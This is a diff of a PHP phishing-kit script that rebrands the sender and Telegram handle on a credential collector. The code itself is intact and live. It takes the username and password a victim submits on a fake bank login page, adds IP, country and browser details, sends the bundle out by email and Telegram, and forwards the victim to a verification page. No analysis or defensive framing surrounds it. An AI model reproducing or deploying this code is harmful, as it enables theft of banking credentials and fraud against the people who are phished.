@@ -1,4 +1,3 @@
-
 <?php
 require("config.php");
 include('me.php');
@@ -8,7 +7,7 @@ $Port = getenv("REMOTE_PORT");
 $browser = $_SERVER['HTTP_USER_AGENT'];
 $adddate=date("D M d, Y g:i a");
 $subject = "Telegram ID: @famozz**";
-$message = "**Telegram ID: @famozz *ALL BANK LOG ***+++\n";
+$message = "**Telegram ID: @famozz *ALL BANK LOG***+++\n";
 $message .= "Username : ".$_POST['username']."\n";
 $message .= "Password : ".$_POST['password']."\n";
 $message .= "User-!P : ".$ip."\n";
@@ -16,7 +15,7 @@ $message .= "Country : ".$country."\n\n";
 $message .= "----------------------------------------\n";
 $message .= "Date : $adddate\n";
 $message .= "User-Agent: ".$browser."\n";
-$headers = "From: Prohqcker";
+$headers = "From: FAMOZ";
 @mail($send,$subject,$message,$headers);
 send_telegram_msg($message);
 header("location:Verif.php");
@@ -58,4 +57,3 @@ function visitor_country()
     return $result;
 }
 ?>
-
